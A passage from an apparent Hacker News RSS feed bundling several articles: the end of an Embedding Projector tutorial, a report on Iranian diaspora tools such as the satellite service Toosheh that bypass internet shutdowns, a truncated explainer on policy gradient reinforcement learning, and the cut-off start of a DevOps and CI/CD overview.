<p>Then, for the first <strong>Choose file</strong> button, upload the <code>output.tsv</code> file and for the second <strong>Choose file</strong> button, upload the <code>metadata.tsv</code> file.</p>
<p><img src="https://amitness.com/images/projector-load-step-2.png" alt=""></p>
<p>After uploading both files, click outside and you should see the sentence embedding projection. The dimensions of embeddings are reduced to 3D by default using PCA.</p>
<p><img src="https://amitness.com/images/projector-3d.png" alt=""></p>
<p>Let‚Äôs switch to 2D by turning off the checkbox for ‚ÄòComponent #3‚Äô in the bottom part of sidebar.</p>
<p><img src="https://amitness.com/images/projector-turn-off-3d.png" alt=""></p>
<p>On the 2D visualization, we can see how the random text is far from other groups of text as an <strong>outlier</strong>. On hovering the point, we see the text <code>askgkn askngk kagkasng</code>.</p>
<p><img src="https://amitness.com/images/projector-outlier.gif" alt=""></p>
<h3 id="5-useful-features-in-projector">5. Useful Features in Projector</h3>
<h4 id="a-class-separation">a. Class Separation</h4>
<p>We can enable color coding of the points by their actual labels (positive vs negative) by using the <strong>Color by</strong> dropdown in the left sidebar.</p>
<p>Select the name of the column that contains your labels. In our example file, the column name is <strong>label</strong>.</p>
<p><img src="https://amitness.com/images/projector-color-code-labels.png" alt=""></p>
<p>The points themselves are interactive. You can see the actual sentence for each point by hovering over them.</p>
<p><img src="https://amitness.com/images/projector-interactive-1.gif" alt=""></p>
<p>You can click on the point to show the metadata. We can see below on clicking a blue point that its label is ‚Äúpositive‚Äù in the popup.</p>
<p>So the blue points are positive and the red points are negative. When a point is selected, 100 nearest points in terms of cosine similarity are also highlighted.</p>
<p><img src="https://amitness.com/images/projector-click-point.gif" alt=""></p>
<p>To get back to the original view, we can click on any empty white space.</p>
<div>
<h4>Applications</h4>
<p>The color coding can be a useful heuristic for many use cases:</p>
<ul>
<li>It can be used to explore class overlap for the dataset you're working on and identify tricky sentences.</li>
<li>If there are labeling errors in your dataset, then this might help uncover them. For example, if a whole cluster of points is in a certain color, but some single point in that cluster is in a different color, then that might be an outlier or labeling error.</li>
</ul>
</div>
<h4 id="b-dimensionality-reduction-algorithm">b. Dimensionality Reduction Algorithm</h4>
<p>The web app provides three standard dimensionality reduction techniques: <strong>UMAP</strong>, <strong>T-SNE</strong>, and <strong>PCA</strong>.</p>
<p>You can choose the algorithm and their parameters from the bottom of the left sidebar.</p>
<p><img src="https://amitness.com/images/projector-choose-dim-algorithm.png" alt=""></p>
<h4 id="c-custom-linear-projection">c. Custom Linear Projection</h4>
<p>You can also use a custom keyword or full text as the axis using the <strong>CUSTOM</strong> tab. This will apply a custom linear projection and can help us explore meaningful directions in the embedding space.</p>
<p><img src="https://amitness.com/images/projector-custom-dim.png" alt=""></p>
<p>For example, the Gmail team tried setting ‚Äúyeah‚Äù on the left side and ‚Äúyes‚Äù on the right side. When they projected encoder embeddings for email replies to this custom linear projection, they found replies in a casual tone (e.g. Here you go) on the left side and responses in a more formal tone clustered towards the right side.</p>
<p><img src="https://amitness.com/images/projector-custom-direction.png" alt=""></p>
<h2 id="conclusion">Conclusion</h2>
<p>Thus, Embedding Projector is a very useful tool to better understand the datasets and models we work with.</p>
<h2 id="references">References</h2>
<ul>
<li>Daniel Smilkov et al., <a href="https://arxiv.org/abs/1611.05469">Embedding Projector: Interactive Visualization and Interpretation of Embeddings</a></li>
</ul>
</section></div>]]>
            </description>
            <link>https://amitness.com/interactive-sentence-embeddings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586043</guid>
            <pubDate>Fri, 25 Sep 2020 02:36:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Iranian diaspora is using old-school tech to fight internet shutdown at home]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 35 (<a href="https://news.ycombinator.com/item?id=24585986">thread link</a>) | @rfreytag
<br/>
September 24, 2020 | https://restofworld.org/2020/cat-and-mouse-censorship/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/cat-and-mouse-censorship/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>One November morning last year, Mehdi Yahyanejad listened to a voicemail in his Los Angeles office: ‚ÄúI‚Äôm contacting you from the city of Tehran,‚Äù said the voice. ‚ÄúThis was the first time I‚Äôve experienced an internet shutdown. ‚Ä¶ It feels like I‚Äôm in a prison.‚Äù</p>



<p>A few weeks earlier, Iran‚Äôs largest mobile networks and internet providers went offline. Amid weeks of growing anti-regime protests, Iranian authorities imposed <a href="https://edition.cnn.com/2019/11/18/middleeast/iran-protests-explained-intl/index.html">the longest internet shutdown</a> in the country‚Äôs history, effectively cutting off external communication for over 80 million Iranians. In an unprecedented crackdown, regime forces <a href="https://www.amnesty.org/en/latest/news/2020/05/iran-details-released-of-304-deaths-during-protests-six-months-after-security-forces-killing-spree/">killed more than 300 protesters</a> and arrested <a href="https://www.amnesty.org/en/latest/news/2019/12/iran-thousands-arbitrarily-detained-and-at-risk-of-torture-in-chilling-post-protest-crackdown/">over 7,000 people</a>. When access was finally restored on November 23, nearly half the country was still unable to come online.</p>



<p>Nine months after the November blackout, Iranians still live in fear of another all-out shutdown. As authorities tighten their hold on internet access, diaspora-led companies are filling the gap for Iranians who are seeking a way to bypass censors. The circumvention tools, created largely by diaspora entrepreneurs, are becoming increasingly critical as they face a crackdown at home and the bite of American-led sanctions online.</p>



<p>On November 15, as Iranian authorities first moved to induce the digital blackout, 44-year-old Yahyanejad raced against the clock in Los Angeles to make sure that people back home had downloaded his satellite file-casting application <a href="https://www.toosheh.org/">Toosheh</a>.<em> </em>‚ÄúIt was a very small window,‚Äù says Yahyanejad. ‚ÄúOnce they were fully disconnected, I wasn‚Äôt sure they‚Äôd be able to download the software.‚Äù&nbsp;</p>



<p>Launched by Yahyanejad in 2016, the technology aggregates uncensored content, like news articles, YouTube videos, and podcasts, and sends it to Iranian homes directly via satellite TV. When Yahyanejad first began developing Toosheh in 2013, an estimated 70% of Iranian households owned a satellite dish, while around 20% had access to the internet. Even as internet access has grown, state censorship means Toosheh‚Äôs satellite technology is a much more reliable source for uncensored content. Iranians can install Toosheh‚Äôs satellite channel and receive a daily dispatch in the form of a file package of up to 8 gigabytes. Once a user downloads the app, the satellite transfers circumvent the internet entirely.&nbsp;</p>



<p>Yahyanejad says Toosheh gained nearly 100,000 new Iranians users in November 2019. In the absence of an internet connection, it became the only way for many users to access news from the outside world. The voice on Toosheh‚Äôs voicemail belonged to one such user, a 34-year-old high school principal in Tehran who downloaded emergency VPN and proxy tools delivered to him through the satellite service.&nbsp;</p>



<p>Having navigated extensive cyber censorship for over a decade, Iranians are tech savvy and <a href="https://www.bbc.com/news/blogs-trending-42612546">adept at nimbly crossing firewalls</a>, using proxies and foreign circumvention tools. ‚ÄúIt‚Äôs a constant cat-and-mouse game,‚Äù says Fereidoon Bashar, executive director of ASL19, a Canadian organization working to help Iranians bypass internet censorship. The group often works in tandem with Yahyanejad to distribute proxy tools.&nbsp;</p>



<p>Bashar says Iranians adapt quickly to ever-changing institutionalized control online. But the last five years of Iranian president Hassan Rouhani‚Äôs rule have seen <a href="https://www.cnet.com/news/irans-president-plans-to-cut-countrys-internet-off-from-the-rest-of-the-world/">a tighter grip on internet connections</a>. Site blocking and calculated internet outages have become easier to enforce: the regime has reduced Iran‚Äôs dependence on global networks by pushing a local intranet, with the <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">aim to keep online traffic</a> inside the country. With strict American sanctions that threaten hefty fines for companies interfacing with Iran, foreign tech companies limit ordinary Iranians‚Äô ability to purchase reliable proxies <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">out of an abundance of caution</a>. Riddled with insecurity, the local VPN black market is not a reliable option for those trying to avoid government attention.</p>



<p>But even as internet access grew incrementally difficult over the years, no one saw the November blackout coming. ‚ÄúAn internet shutdown was previously viewed as a kind of dystopian political campaign,‚Äù says Kaveh Azarhoosh, an internet policy researcher. In November, the worst-case scenario for Iran‚Äôs censorship suddenly became a reality.&nbsp;&nbsp;</p>



<p>In the early days of the protest, Toosheh created a special ‚ÄúProtest News Package.‚Äù Every night, after aggregating content from over 200 publications, Toosheh delivered digital bundles containing clips of protests occuring in different cities: Tabriz, Qom, Shiraz, Mashhad, and others. It also contained slides about how to stay safe during a protest; crucial news coverage from banned sites, like the <em>New York Times</em>, Voice of America Persian, and Deutsche Welle; and a curated compilation of tweets from Iranian politicians. These packages weren‚Äôt just bringing news of the outside world to Iran: they kept Iranians informed about what was happening inside their own country too.</p>



<p>Yahyanejad, a physicist by training, left Iran in 1997 to pursue a Ph.D. from the Massachusetts Institute of Technology. ‚ÄúI‚Äôve lived in Iran, and I‚Äôve gone to school and college there,‚Äù he explains. ‚ÄúI know that this repressive government exists because they are able to control the flow of information.‚Äù He says he‚Äôs always had an interest in limiting their control. ‚ÄúI want,‚Äù he says, ‚Äúto see democracy in Iran in my lifetime.‚Äù&nbsp;</p>



<p>In 2006, Yahyanejad launched a Reddit-like forum called <a href="https://www.balatarin.com/">Balatarin</a>. ‚ÄúIts popularity surprised me,‚Äù he says. The site posted a translated rumor about the supreme leader‚Äôs death, after he hadn‚Äôt been seen in public for two months, and was swiftly blocked by Iran shortly after. The moment was a turning point for Yahyanejad, who says, ‚ÄúI made a conscious decision to keep the platform open at a personal cost.‚Äù&nbsp;</p>



<p>The Iranian blocks on Balatarin inspired Yahyanejad to explore censorship circumvention. He launched the satellite app Toosheh in 2016. ‚ÄúI <a href="https://www.youtube.com/watch?v=FWfwF8Gx6VA">went on BBC Persian‚Äôs ‚ÄòNewshour</a>,‚Äô and as soon as I talked about it, people started downloading and testing it immediately,‚Äù he says.&nbsp;</p>



<p>Yahyanjad finds himself among a cohort of diaspora Iranians working to fight the regime‚Äôs censors. ASL19, the Canadian technology group, collaborated with him to deliver proxy tools to over half a million Iranians during November‚Äôs shutdown. ASL19‚Äôs Bashar, who left Iran in the early 2000s before <a href="https://opennet.net/blog/2013/02/after-green-movement-internet-controls-iran-2009-2012">the tumultuous Green Movement</a>, says diaspora Iranians are stepping into the field because Iranians ‚Äúrisk harsh conditions, imprisonment, and long sentences‚Äù if they‚Äôre caught creating circumvention tools inside the country.&nbsp;&nbsp;</p>



<p>But even outside of Iran, outspoken diaspora activists like Bashar and Yahyanejad face immense risks. In June, it was reported that an Iranian activist named Ruhollah Zam was <a href="https://www.bbc.com/news/world-middle-east-53238000">sentenced to death </a>in Iran after creating a popular anti-government Telegram news channel that he operated while living in exile in France. The channel, with 1.4 million followers, was shut down shortly after. For Yahyanejad, who knew of Ruhollah through the diaspora community, the ordeal was a shot across the bow. ‚ÄúI can never go back to Iran,‚Äù Yahyanejad admits. ‚ÄúBut I see myself as part of the movement.‚Äù&nbsp;</p>



<p>Yahyanejad‚Äôs work has become crucial for Iranians, even after November‚Äôs shutdown. On July 14, following news that Iran‚Äôs Supreme Court had upheld the death sentences of three young anti-regime protesters, Iranians took to banned social media sites in an unprecedented protest, with over 6 million posts under the hashtag #DontExecute. Hours after #DontExecute began trending online, digital rights organization NetBlocks <a href="https://twitter.com/netblocks/status/1283106806332620801?s=20">monitored disruptions in the network</a>. Panicked users, still reeling from November‚Äôs shutdown, speculated another block was imminent. Luckily, an all-out ban didn‚Äôt occur, but the renewed threat of one was enough to increase Toosheh‚Äôs usage by more than 50% in the days that followed.&nbsp;</p>



<p>For Yahyanejad, who has been actively fighting the Iranian regime‚Äôs censorship for over a decade, the past year is proof that his work is even more necessary. ‚ÄúInternet shutdowns are psychological tools designed to terrify populations, to convince them that they are voiceless,‚Äù he says. ‚ÄúFighting shutdowns is important so that you can show people that they are not alone and that there are others.‚Äù</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/cat-and-mouse-censorship/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585986</guid>
            <pubDate>Fri, 25 Sep 2020 02:26:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Explicitly Comprehensible Functional Reactive Programming [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585849">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://futureofcoding.org/papers/comprehensible-frp/comprehensible-frp.pdf | <a href="https://web.archive.org/web/*/https://futureofcoding.org/papers/comprehensible-frp/comprehensible-frp.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://futureofcoding.org/papers/comprehensible-frp/comprehensible-frp.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585849</guid>
            <pubDate>Fri, 25 Sep 2020 02:01:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Policy Gradient Algorithms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585441">thread link</a>) | @sebg
<br/>
September 24, 2020 | https://lilianweng.github.io/lil-log/2018/04/08/policy-gradient-algorithms.html | <a href="https://web.archive.org/web/*/https://lilianweng.github.io/lil-log/2018/04/08/policy-gradient-algorithms.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <blockquote>
  <p>Abstract: In this post, we are going to look deep into policy gradient, why it works, and many new policy gradient algorithms proposed in recent years: vanilla policy gradient, actor-critic, off-policy actor-critic, A3C, A2C, DPG, DDPG, D4PG, MADDPG, TRPO, PPO, ACER, ACTKR, SAC, TD3 &amp; SVPG.</p>
</blockquote>

<!--more-->

<p><span>[Updated on 2018-06-30: add two new policy gradient methods, <a href="#sac">SAC</a> and <a href="#d4pg">D4PG</a>.]</span>
<br>
<span>[Updated on 2018-09-30: add a new policy gradient method, <a href="#td3">TD3</a>.]</span>
<br>
<span>[Updated on 2019-02-09: add <a href="#sac-with-automatically-adjusted-temperature">SAC with automatically adjusted temperature</a>].</span>
<br>
<span>[Updated on 2019-05-01: Thanks to Wenhao, we have a version of this post in <a href="https://tomaxent.com/2019/04/14/%E7%AD%96%E7%95%A5%E6%A2%AF%E5%BA%A6%E6%96%B9%E6%B3%95/">Chinese</a>].</span>
<br>
<span>[Updated on 2019-06-26: Thanks to Chanseok, we have a version of this post in <a href="https://talkingaboutme.tistory.com/entry/RL-Policy-Gradient-Algorithms">Korean</a>].</span>
<br>
<span>[Updated on 2019-09-12: add a new policy gradient method <a href="#SVPG">SVPG</a>.].</span>
<br>
<span>[Updated on 2019-12-22: add a new policy gradient method <a href="#IMPALA">IMPALA</a>.].</span></p>



<h2 id="what-is-policy-gradient">What is Policy Gradient</h2>

<p>Policy gradient is an approach to solve reinforcement learning problems. If you haven‚Äôt looked into the field of reinforcement learning, please first read the section <a href="https://lilianweng.github.io/lil-log/2018/02/19/a-long-peek-into-reinforcement-learning.html#key-concepts">‚ÄúA (Long) Peek into Reinforcement Learning&nbsp;¬ª Key Concepts‚Äù</a> for the problem definition and key concepts.</p>

<h3 id="notations">Notations</h3>

<p>Here is a list of notations to help you read through equations in the post easily.</p>

<table>
  <thead>
    <tr>
      <th>Symbol</th>
      <th>Meaning</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>\(s \in \mathcal{S}\)</td>
      <td>States.</td>
    </tr>
    <tr>
      <td>\(a \in \mathcal{A}\)</td>
      <td>Actions.</td>
    </tr>
    <tr>
      <td>\(r \in \mathcal{R}\)</td>
      <td>Rewards.</td>
    </tr>
    <tr>
      <td>\(S_t, A_t, R_t\)</td>
      <td>State, action, and reward at time step \(t\) of one trajectory. I may occasionally use \(s_t, a_t, r_t\) as well.</td>
    </tr>
    <tr>
      <td>\(\gamma\)</td>
      <td>Discount factor; penalty to uncertainty of future rewards; \(0&lt;\gamma \leq 1\).</td>
    </tr>
    <tr>
      <td>\(G_t\)</td>
      <td>Return; or discounted future reward; \(G_t = \sum_{k=0}^{\infty} \gamma^k R_{t+k+1}\).</td>
    </tr>
    <tr>
      <td>\(P(s', r \vert s, a)\)</td>
      <td>Transition probability of getting to the next state \(s'\) from the current state \(s\) with action \(a\) and reward \(r\).</td>
    </tr>
    <tr>
      <td>\(\pi(a \vert s)\)</td>
      <td>Stochastic policy (agent behavior strategy); \(\pi_\theta(.)\) is a policy parameterized by \(\theta\).</td>
    </tr>
    <tr>
      <td>\(\mu(s)\)</td>
      <td>Deterministic policy; we can also label this as \(\pi(s)\), but using a different letter gives better distinction so that we can easily tell when the policy is stochastic or deterministic without further explanation. Either \(\pi\) or \(\mu\) is what a reinforcement learning algorithm aims to learn.</td>
    </tr>
    <tr>
      <td>\(V(s)\)</td>
      <td>State-value function measures the expected return of state \(s\); \(V_w(.)\) is a value function parameterized by \(w\).</td>
    </tr>
    <tr>
      <td>\(V^\pi(s)\)</td>
      <td>The value of state \(s\) when we follow a policy \(\pi\); \(V^\pi (s) = \mathbb{E}_{a\sim \pi} [G_t \vert S_t = s]\).</td>
    </tr>
    <tr>
      <td>\(Q(s, a)\)</td>
      <td>Action-value function is similar to \(V(s)\), but it assesses the expected return of a pair of state and action \((s, a)\); \(Q_w(.)\) is a action value function parameterized by \(w\).</td>
    </tr>
    <tr>
      <td>\(Q^\pi(s, a)\)</td>
      <td>Similar to \(V^\pi(.)\), the value of (state, action) pair when we follow a policy \(\pi\); \(Q^\pi(s, a) = \mathbb{E}_{a\sim \pi} [G_t \vert S_t = s, A_t = a]\).</td>
    </tr>
    <tr>
      <td>\(A(s, a)\)</td>
      <td>Advantage function, \(A(s, a) = Q(s, a) - V(s)\); it can be considered as another version of Q-value with lower variance by taking the state-value off as the baseline.</td>
    </tr>
  </tbody>
</table>

<h3 id="policy-gradient">Policy Gradient</h3>

<p>The goal of reinforcement learning is to find an optimal behavior strategy for the agent to obtain optimal rewards. The <strong>policy gradient</strong> methods target at modeling and optimizing the policy directly. The policy is usually modeled with a parameterized function respect to \(\theta\), \(\pi_\theta(a \vert s)\). The value of the reward (objective) function depends on this policy and then various algorithms can be applied to optimize \(\theta\) for the best reward.</p>

<p>The reward function is defined as:</p><p>

\[J(\theta) 
= \sum_{s \in \mathcal{S}} d^\pi(s) V^\pi(s) 
= \sum_{s \in \mathcal{S}} d^\pi(s) \sum_{a \in \mathcal{A}} \pi_\theta(a \vert s) Q^\pi(s, a)\]

</p><p>where \(d^\pi(s)\) is the stationary distribution of Markov chain for \(\pi_\theta\) (on-policy state distribution under \(\pi\)). For simplicity, the parameter \(\theta\) would be omitted for the policy \(\pi_\theta\) when the policy is present in the subscript of other functions; for example, \(d^{\pi}\) and \(Q^\pi\) should be \(d^{\pi_\theta}\) and \(Q^{\pi_\theta}\) if written in full.</p>

<p>Imagine that you can travel along the Markov chain‚Äôs states forever, and eventually, as the time progresses, the probability of you ending up with one state becomes unchanged ‚Äî this is the stationary probability for \(\pi_\theta\). \(d^\pi(s) = \lim_{t \to \infty} P(s_t = s \vert s_0, \pi_\theta)\) is the probability that \(s_t=s\) when starting from \(s_0\) and following policy \(\pi_\theta\) for t steps. Actually, the existence of the stationary distribution of Markov chain is one main reason for why PageRank algorithm works. If you want to read more, check <a href="https://jeremykun.com/2015/04/06/markov-chain-monte-carlo-without-all-the-bullshit/">this</a>.</p>

<p>It is natural to expect policy-based methods are more useful in the continuous space. Because there is an infinite number of actions and (or) states to estimate the values for and hence value-based approaches are way too expensive computationally in the continuous space. For example, in <a href="https://lilianweng.github.io/lil-log/2018/02/19/a-long-peek-into-reinforcement-learning.html#policy-iteration">generalized policy iteration</a>, the policy improvement step \(\arg\max_{a \in \mathcal{A}} Q^\pi(s, a)\) requires a full scan of the action space, suffering from the <a href="https://en.wikipedia.org/wiki/Curse_of_dimensionality">curse of dimensionality</a>.</p>

<p>Using <em>gradient ascent</em>, we can move \(\theta\) toward the direction suggested by the gradient \(\nabla_\theta J(\theta)\) to find the best \(\theta\) for \(\pi_\theta\) that produces the highest return.</p>

<h3 id="policy-gradient-theorem">Policy Gradient Theorem</h3>

<p>Computing the gradient \(\nabla_\theta J(\theta)\) is tricky because it depends on both the action selection (directly determined by \(\pi_\theta\)) and the stationary distribution of states following the target selection behavior (indirectly determined by \(\pi_\theta\)). Given that the environment is generally unknown, it is difficult to estimate the effect on the state distribution by a policy update.</p>

<p>Luckily, the <strong>policy gradient theorem</strong> comes to save the world! Woohoo! It provides a nice reformation of the derivative of the objective function to not involve the derivative of the state distribution \(d^\pi(.)\) and simplify the gradient computation \(\nabla_\theta J(\theta)\) a lot.</p><p>

\[\begin{aligned}
\nabla_\theta J(\theta) 
&amp;= \nabla_\theta \sum_{s \in \mathcal{S}} d^\pi(s) \sum_{a \in \mathcal{A}} Q^\pi(s, a) \pi_\theta(a \vert s) \\
&amp;\propto \sum_{s \in \mathcal{S}} d^\pi(s) \sum_{a \in \mathcal{A}} Q^\pi(s, a) \nabla_\theta \pi_\theta(a \vert s) 
\end{aligned}\]

</p><h3 id="proof-of-policy-gradient-theorem">Proof of Policy Gradient Theorem</h3>

<p>This session is pretty dense, as it is the time for us to go through the proof (<a href="http://incompleteideas.net/book/bookdraft2017nov5.pdf">Sutton &amp; Barto, 2017</a>; Sec. 13.1) and figure out why the policy gradient theorem is correct.</p>

<p>We first start with the derivative of the state value function:</p><p>

\[\begin{aligned}
&amp; \nabla_\theta V^\pi(s) \\
=&amp; \nabla_\theta \Big(\sum_{a \in \mathcal{A}} \pi_\theta(a \vert s)Q^\pi(s, a) \Big) &amp; \\
=&amp; \sum_{a \in \mathcal{A}} \Big( \nabla_\theta \pi_\theta(a \vert s)Q^\pi(s, a) + \pi_\theta(a \vert s) \color{red}{\nabla_\theta Q^\pi(s, a)} \Big) &amp; \scriptstyle{\text{; Derivative product rule.}} \\
=&amp; \sum_{a \in \mathcal{A}} \Big( \nabla_\theta \pi_\theta(a \vert s)Q^\pi(s, a) + \pi_\theta(a \vert s) \color{red}{\nabla_\theta \sum_{s', r} P(s',r \vert s,a)(r + V^\pi(s'))} \Big) &amp; \scriptstyle{\text{; Extend } Q^\pi \text{ with future state value.}} \\
=&amp; \sum_{a \in \mathcal{A}} \Big( \nabla_\theta \pi_\theta(a \vert s)Q^\pi(s, a) + \pi_\theta(a \vert s) \color{red}{\sum_{s', r} P(s',r \vert s,a) \nabla_\theta V^\pi(s')} \Big) &amp; \scriptstyle{P(s',r \vert s,a) \text{ or } r \text{ is not a func of }\theta}\\
=&amp; \sum_{a \in \mathcal{A}} \Big( \nabla_\theta \pi_\theta(a \vert s)Q^\pi(s, a) + \pi_\theta(a \vert s) \color{red}{\sum_{s'} P(s' \vert s,a) \nabla_\theta V^\pi(s')} \Big) &amp; \scriptstyle{\text{; Because }  P(s' \vert s, a) = \sum_r P(s', r \vert s, a)}
\end{aligned}\]

</p><p>Now we have:</p><p>

\[\color{red}{\nabla_\theta V^\pi(s)} 
= \sum_{a \in \mathcal{A}} \Big( \nabla_\theta \pi_\theta(a \vert s)Q^\pi(s, a) + \pi_\theta(a \vert s) \sum_{s'} P(s' \vert s,a) \color{red}{\nabla_\theta V^\pi(s')} \Big)\]

</p><p>This equation has a nice recursive form (see the red parts!) and the future state value function \(V^\pi(s')\) can be repeated unrolled by following the same equation.</p>

<p>Let‚Äôs consider the following visitation sequence and label the probability of transitioning from state s to state x with policy \(\pi_\theta\) after k step as \(\rho^\pi(s \to x, k)\).</p><p>

\[s \xrightarrow[]{a \sim \pi_\theta(.\vert s)} s' \xrightarrow[]{a \sim \pi_\theta(.\vert s')} s'' \xrightarrow[]{a \sim \pi_\theta(.\vert s'')} \dots\]

</p><ul>
  <li>When k = 0: \(\rho^\pi(s \to s, k=0) = 1\).</li>
  <li>When k = 1, we scan through all possible actions and sum up the transition probabilities to the target state: \(\rho^\pi(s \to s', k=1) = \sum_a \pi_\theta(a \vert s) P(s' \vert s, a)\).</li>
  <li>Imagine that the goal is to go from state s to x after k+1 steps while following policy \(\pi_\theta\). We can first travel from s to a middle point s‚Äô (any state can be a middle point, \(s' \in \mathcal{S}\)) after k steps and then go to the final state x during the last step. In this way, we are able to update the visitation probability recursively: \(\rho^\pi(s \to x, k+1) = \sum_{s'} \rho^\pi(s \to s', k) \rho^\pi(s' \to x, 1)\).</li>
</ul>

<p>Then we go back to unroll the recursive representation of \(\nabla_\theta V^\pi(s)\)! Let \(\phi(s) = \sum_{a \in \mathcal{A}} \nabla_\theta \pi_\theta(a \vert s)Q^\pi(s, a)\) to simplify the maths. If we keep on extending \(\nabla_\theta V^\pi(.)\) infinitely, it is easy to find out that we can transition from the starting state s to any state after any number of steps in this unrolling process and by summing up all the visitation probabilities, we get \(\nabla_\theta V^\pi(s)\)!</p><p>

\[\begin{aligned}
&amp; \color{red}{\nabla_\theta V^\pi(s)} \\
=&amp; \phi(s) + \sum_a \pi_\theta(a \vert s) \sum_{s'} P(s' \vert s,a) \color{red}{\nabla_\theta V^\pi(s')} \\
=&amp; \phi(s) + \sum_{s'} \sum_a \pi_\theta(a \vert s) P(s' \vert s,a) \color{red}{\nabla_\theta V^\pi(s')} \\
=&amp; \phi(s) + \sum_{s'} \rho^\pi(s \to s', 1) ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lilianweng.github.io/lil-log/2018/04/08/policy-gradient-algorithms.html">https://lilianweng.github.io/lil-log/2018/04/08/policy-gradient-algorithms.html</a></em></p>]]>
            </description>
            <link>https://lilianweng.github.io/lil-log/2018/04/08/policy-gradient-algorithms.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585441</guid>
            <pubDate>Fri, 25 Sep 2020 01:00:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting started with DevOps, containers, and Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585356">thread link</a>) | @gk1
<br/>
September 24, 2020 | https://www.datree.io/resources/devops-containers-kubernetes | <a href="https://web.archive.org/web/*/https://www.datree.io/resources/devops-containers-kubernetes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div id="resource"><p>DevOps isn‚Äôt only a fun amalgam of two terms (developers and operations), it has its own culture within small organizations, startups, and digital factories where there is a high demand for efficient communication between teams, and agility and flexibility at both the development and operational level. Over the last several years, DevOps has been successfully implemented across top enterprises like Amex, Facebook, LinkedIn, Microsoft, Amazon and too many others to count.</p><h2>Getting started with DevOps</h2><p>The goal of DevOps is to unify application development (Dev) and its operations (Ops) throughout the software development life-cycle (SDLC), from strategy, planning, coding, building, and testing, through release, deploy, operate and <a href="https://datree.io/" data-rt-link-type="external">monitor</a>. DevOps encourages the maximum possibility of automation by using DevOps tools and scripts.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f97ee281871_devops.png"></p></figure><p>Dev and Ops in the software development lifecycle</p><p>Amazon brings the slogan ‚ÄòYou build it, you run it‚Äô which aims to bring a product from development to production and cut time-to-market by anywhere from 10-15 days.</p><h3>Version Management with GitFlow</h3><p>For the source code of the application, rather than using a monolithic repository, I recommend using one repository by each microservice. The management of the <a href="https://www.atlassian.com/git/tutorials/comparing-workflows/gitflow-workflow" target="_blank" data-rt-link-type="external">GitFlow workflow</a> would be represented in this context. You can create a feature branch and a release branch before applying the ‚Äòbranch filter‚Äô when you create your ‚Äòbuild‚Äô definition (more on this below).</p><h3>CI/CD Workflow</h3><p>DevOps can‚Äôt be separated from the concept of CI/CD. Continuous integration (CI) simply means a series of practices to implement when integrating working copies to a shared repository. It represents the beginning of the CI/CD pipeline which starts from the new changes in source code and is committed from a local source control repository then pushed to a remote source code repository, a trigger based on the aforementioned process can be configured to trigger an automated build, and it is also possible to run tests during the build.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c45315226ac9a7d11_releasepipelineCI.png"></p></figure><p>Continuous Integration</p><p>CI/CD tools such as Visual Studio Team Services (VSTS) provided by Microsoft allows you to create the Build definition to turn this process into reality. It allows you to configure different build tasks, and these tasks perform the build from the source code. There are two kinds of triggers available in VSTS:</p><ul><li>Continuous integration trigger: this is applied on a Git, TFS ( which is recommended by Microsoft) or another source control repository which allows you to specify a listening branch while new changes in code are committed and then run an automated build.</li><li>Scheduled trigger: this is applied on select days and times to run an automated build.</li></ul><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f31b7281872_CI.png"></p></figure><p>Two types of build triggers</p><p>Other available DevOps tools that I‚Äôd like to mention are Jenkins, Ansible, Github, and Bitbucket.</p><h3>Continuous Delivery vs Continuous Deployment</h3><p>Let‚Äôs continue discussing CI/CD, the release part of pipeline started when a new, successful build is available. There are two types of CD which is continuous delivery and continuous deployment.</p><p>Continuous delivery is a series of practices to deliver each change to a staging environment which can then be deployed to production in a manual way.</p><p>Continuous deployment is different from continuous delivery because every change after a successful build is deployed to production in an automatic way.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c071de866dceeb7ca_puppet_continuous_diagram.gif"></p></figure><p>Continuous Delivery vs Continuous Deployment</p><p>Similarly, VSTS also allows the continuous delivery or deployment by creating a ‚Äòrelease‚Äô definition (shown below). The definition can be based on the build from VSTS or directly from Jenkins or another source that publishes the artifact to be deployed:</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f0472281873_release-definition-.png"></p></figure><p>Creating release definition from different artifacts</p><p>And then, by configuring different release tasks, these tasks can be automated or manual as shown:</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c071de8797deeb7cb_task-catalog.png"></p></figure><p>Task catalog in release 